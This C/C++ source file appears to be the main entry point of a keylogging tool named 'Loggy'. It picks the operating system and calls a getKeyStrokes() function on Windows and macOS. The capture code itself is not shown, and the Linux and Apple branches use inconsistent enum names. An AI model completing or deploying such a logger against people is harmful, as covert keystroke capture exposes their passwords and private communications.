#include "include/core.h"
#include "include/externals.h"

#ifdef _WIN32
Loggy::Types::OPERATING_SYSTEM operatingSystem = Loggy::Types::OPERATING_SYSTEM::WINDOWS;
#endif

#ifdef linux
OPERATING_SYSTEM operatingSystem = LINUX;
#endif

#ifdef __APPLE__
OPERATING_SYSTEM operatingSystem = MAC;
#endif

int main() {
    switch (operatingSystem) {
        case Loggy::Types::OPERATING_SYSTEM::WINDOWS:
            printf("Operating System: Windows\n");
            getKeyStrokes();
            break;
        case Loggy::Types::OPERATING_SYSTEM::MAC:
            printf("Operating System: MacOS\n");
            getKeyStrokes();
            break;
        case Loggy::Types::OPERATING_SYSTEM::LINUX:
            printf("Operating System: Linux Not Implemented\n");
            return 1;
        default:
            printf("OS Not Supported\n");
            return 1;
    }

    return 0;
}